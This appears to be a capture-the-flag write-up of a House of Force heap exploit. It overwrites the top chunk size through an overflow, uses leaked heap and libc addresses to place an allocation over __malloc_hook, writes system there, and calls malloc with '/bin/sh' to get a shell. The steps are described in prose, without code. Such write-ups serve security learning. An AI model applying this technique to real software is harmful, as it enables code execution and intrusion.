### Challenge
#### TL;DR

create a chunk and overwrite the wilderness with a very large number due to an overflow...

this will overlap the target address and resulting in read-what-where, which we can use it to overwrite malloc_hook with system to pop a shell...

Fortunately, we have free leaks on the main menu and option 2 (heap and libc)...

Also there is an overflow in option 3 so we can create a chunk then overwrite the wilderness (the top chunk's size) with a very large number (e.g. -1)

this will make sure that malloc won't use `mmap` for any further allocations because it will think the top chunk has always *enough* space..

and this will result in overlapping target address (read-what-where)...

Here is my approach with helpful heap snippets to improve visuality:


![newwilderness](https://github.com/user-attachments/assets/47fb63ae-68a5-46e8-b76c-bf89da5d1922)

> Use the overflow in option 3 to overwrite the wilderness with a very large number.

![overlapsize](https://github.com/user-attachments/assets/2cb9e4e7-8221-4398-a75d-f3bbffa74f19)

> Calculate the address of wilderness and the target from the leaks and allocate a chunk with size of target - top_addr - 0x10 # for metadata

![systemoverwrite](https://github.com/user-attachments/assets/f5518ba2-59f8-4808-99ed-6df30c7f0f5e)

> Overwrite malloc_hook pointer (the target address) with system

> > ... and finally call malloc with the address of "/bin/sh" in size to pop a shell

Calculating the offset for distances was quite painful until I get the hang of it...
